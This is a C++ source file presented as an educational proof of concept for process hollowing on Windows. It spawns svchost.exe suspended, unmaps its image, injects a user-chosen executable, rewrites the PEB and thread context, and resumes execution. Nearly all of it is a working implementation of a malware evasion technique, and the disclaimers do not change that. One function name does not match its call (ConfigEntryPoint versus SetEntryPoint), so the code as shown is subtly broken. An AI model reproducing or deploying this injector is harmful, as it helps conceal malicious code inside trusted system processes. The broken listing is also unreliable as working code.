#include <windows.h>
#include <commdlg.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>

// ntunmapviewofsection typedef
typedef LONG(NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

// file picker for selecting the exe
std::wstring SelectPayloadFile() {
    OPENFILENAMEW ofn = {};
    wchar_t szFile[MAX_PATH] = {};

    ofn.lStructSize  = sizeof(ofn);
    ofn.hwndOwner    = NULL;
    ofn.lpstrFile    = szFile;
    ofn.nMaxFile     = MAX_PATH;
    ofn.lpstrFilter  = L"Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
    ofn.lpstrTitle   = L"Select the PE (.exe) file to inject";
    ofn.Flags        = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_NOCHANGEDIR;

    if (GetOpenFileNameW(&ofn)) {
        return std::wstring(szFile);
    }
    return L"";
}

// prints consent screen and asks yes/no
bool AskUserConsent() {
    std::cout << "============================================================\n";
    std::cout << "  PROCESS HOLLOWING - Proof of Concept (PoC)\n";
    std::cout << "============================================================\n";
    std::cout << "\n";
    std::cout << "  This tool demonstrates the 'Process Hollowing' technique\n";
    std::cout << "  for EDUCATIONAL and RESEARCH purposes only.\n";
    std::cout << "\n";
    std::cout << "  What will happen:\n";
    std::cout << "    1. A legitimate Windows process (svchost.exe) will be\n";
    std::cout << "       created in a SUSPENDED state.\n";
    std::cout << "    2. Its memory image will be unmapped.\n";
    std::cout << "    3. The PE file you select will be injected into its\n";
    std::cout << "       address space.\n";
    std::cout << "    4. The thread will be resumed to execute the injected code.\n";
    std::cout << "\n";
    std::cout << "  WARNING: Only use this on systems you own or have explicit\n";
    std::cout << "  permission to test. Misuse may violate laws.\n";
    std::cout << "============================================================\n";
    std::cout << "\n";
    std::cout << "  Do you want to proceed? (yes/no): ";

    std::string answer;
    std::getline(std::cin, answer);

    // trim whitespace
    while (!answer.empty() && (answer.front() == ' ' || answer.front() == '\t')) answer.erase(answer.begin());
    while (!answer.empty() && (answer.back() == ' ' || answer.back() == '\t')) answer.pop_back();

    // lowercase
    for (auto& c : answer) c = (char)tolower((unsigned char)c);

    return (answer == "yes" || answer == "y");
}

// reads the whole file into a vector
std::vector<BYTE> ReadFileToMemory(const std::wstring& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::wcerr << L"  [!] Failed to open file: " << path << std::endl;
        return {};
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer((size_t)size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        std::wcerr << L"  [!] Failed to read file." << std::endl;
        return {};
    }
    return buffer;
}

// spawns svchost.exe in suspended state
bool CreateSuspendedProcess(const wchar_t* targetExe, PROCESS_INFORMATION& pi) {
    STARTUPINFOW si = {};
    si.cb = sizeof(si);

    BOOL success = CreateProcessW(
        targetExe,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "  [!] CreateProcessW failed. Error: " << GetLastError() << std::endl;
        return false;
    }
    return true;
}

// reads peb, gets image base, then unmaps it
bool UnmapProcessImage(PROCESS_INFORMATION& pi, DWORD64& pebAddress, DWORD64& imageBase) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "  [!] GetThreadContext failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // rdx points to peb on process start
    pebAddress = ctx.Rdx;

    // imagebaseaddress is at peb + 0x10
    DWORD64 imgBase = 0;
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(pebAddress + 0x10), &imgBase, sizeof(imgBase), &bytesRead)) {
        std::cerr << "  [!] ReadProcessMemory failed. Error: " << GetLastError() << std::endl;
        return false;
    }
    imageBase = imgBase;

    // get ntunmapviewofsection from ntdll at runtime
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        std::cerr << "  [!] Failed to get ntdll handle." << std::endl;
        return false;
    }

    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) {
        std::cerr << "  [!] Failed to resolve NtUnmapViewOfSection." << std::endl;
        return false;
    }

    LONG status = NtUnmapViewOfSection(pi.hProcess, (PVOID)imgBase);
    if (status != 0) {
        std::cerr << "  [!] NtUnmapViewOfSection failed. NTSTATUS: 0x"
                  << std::hex << (DWORD)status << std::dec << std::endl;
        return false;
    }

    return true;
}

// parses the pe and writes it into the target process
bool InjectPayload(PROCESS_INFORMATION& pi, const std::vector<BYTE>& payload,
                   DWORD64 imageBase, DWORD64& remoteBase, DWORD& entryPointRVA) {
    const BYTE* data = payload.data();

    // e_lfanew is at offset 0x3c in the dos header
    DWORD e_lfanew = *(DWORD*)(data + 0x3C);
    DWORD optHeaderOffset = e_lfanew + 24;

    // grab what we need from the optional header
    entryPointRVA        = *(DWORD*)(data + optHeaderOffset + 16);
    DWORD sizeOfImage    = *(DWORD*)(data + optHeaderOffset + 56);
    DWORD sizeOfHeaders  = *(DWORD*)(data + optHeaderOffset + 60);

    // allocate space in target process at the old image base
    LPVOID allocBase = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)imageBase,
        sizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!allocBase) {
        std::cerr << "  [!] VirtualAllocEx failed. Error: " << GetLastError() << std::endl;
        return false;
    }
    remoteBase = (DWORD64)allocBase;

    // write pe headers first
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, allocBase, data, sizeOfHeaders, &bytesWritten)) {
        std::cerr << "  [!] WriteProcessMemory (headers) failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // write each section one by one
    WORD numSections       = *(WORD*)(data + e_lfanew + 6);
    WORD sizeOfOptHeader   = *(WORD*)(data + e_lfanew + 20);
    DWORD sectionHdrOffset = e_lfanew + 24 + sizeOfOptHeader;

    for (int i = 0; i < numSections; i++) {
        DWORD shOffset       = sectionHdrOffset + (i * 40);
        DWORD virtualAddress = *(DWORD*)(data + shOffset + 12);
        DWORD rawSize        = *(DWORD*)(data + shOffset + 16);
        DWORD rawOffset      = *(DWORD*)(data + shOffset + 20);

        // skip empty sections
        if (rawSize == 0) continue;

        if (!WriteProcessMemory(
                pi.hProcess,
                (LPVOID)(remoteBase + virtualAddress),
                data + rawOffset,
                rawSize,
                &bytesWritten)) {
            std::cerr << "  [!] WriteProcessMemory (section) failed. Error: " << GetLastError() << std::endl;
            return false;
        }
    }

    return true;
}

// patches peb and redirects rcx to the new entry point
bool ConfigEntryPoint(PROCESS_INFORMATION& pi, DWORD64 pebAddress,
                   DWORD64 remoteBase, DWORD entryPointRVA) {
    // update imagebaseaddress in peb
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi.hProcess, (LPVOID)(pebAddress + 0x10),
                            &remoteBase, sizeof(remoteBase), &bytesWritten)) {
        std::cerr << "  [!] WriteProcessMemory (PEB) failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // get context, change rcx to point at our entry
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "  [!] GetThreadContext failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    ctx.Rcx = remoteBase + entryPointRVA;

    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "  [!] SetThreadContext failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

int main() {
    // ask for consent before doing anything
    if (!AskUserConsent()) {
        std::cout << "\n  [!] Operation cancelled by user." << std::endl;
        return 0;
    }

    std::cout << "\n  [+] Consent granted. Opening file picker...\n" << std::endl;

    // let user pick the exe to inject
    std::wstring payloadPath = SelectPayloadFile();
    if (payloadPath.empty()) {
        std::cout << "  [!] No file selected. Exiting." << std::endl;
        return 0;
    }

    std::wcout << L"  [+] Selected file: " << payloadPath << std::endl;

    // read the pe into ram
    std::vector<BYTE> payloadData = ReadFileToMemory(payloadPath);
    if (payloadData.empty()) {
        return 1;
    }

    // target host process
    const wchar_t* target = L"C:\\Windows\\System32\\svchost.exe";

    PROCESS_INFORMATION pi = {};
    if (!CreateSuspendedProcess(target, pi)) return 1;

    DWORD64 pebAddress = 0, imageBase = 0;
    if (!UnmapProcessImage(pi, pebAddress, imageBase)) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    DWORD64 remoteBase = 0;
    DWORD entryPointRVA = 0;
    if (!InjectPayload(pi, payloadData, imageBase, remoteBase, entryPointRVA)) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    if (!SetEntryPoint(pi, pebAddress, remoteBase, entryPointRVA)) {
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // finally wake the thread up
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "  [!] ResumeThread failed. Error: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    std::cout << "\n  [+] Process hollowing completed successfully." << std::endl;

    // cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}

// ==============================================================================
// DISCLAIMER: EDUCATIONAL AND RESEARCH PURPOSES ONLY
//
// This Proof of Concept (PoC) code is created solely for educational,
// academic research, and defensive purposes. The primary goal of this
// project is to demonstrate the mechanics of the "Process Hollowing"
// technique, enabling security researchers, malware analysts, and system
// administrators to better understand, detect, and mitigate such threats.
//
// The author (@yamanist0) is not responsible for any misuse, damage, or
// illegal activities caused by the utilization of this code or associated
// techniques. Any attempt to use this tool on systems, networks, or endpoints
// without explicit, mutual, and authorized consent is strictly prohibited.
//
// By compiling, analyzing, or modifying this code, you assume all
// responsibility and liability for your actions.
// ==============================================================================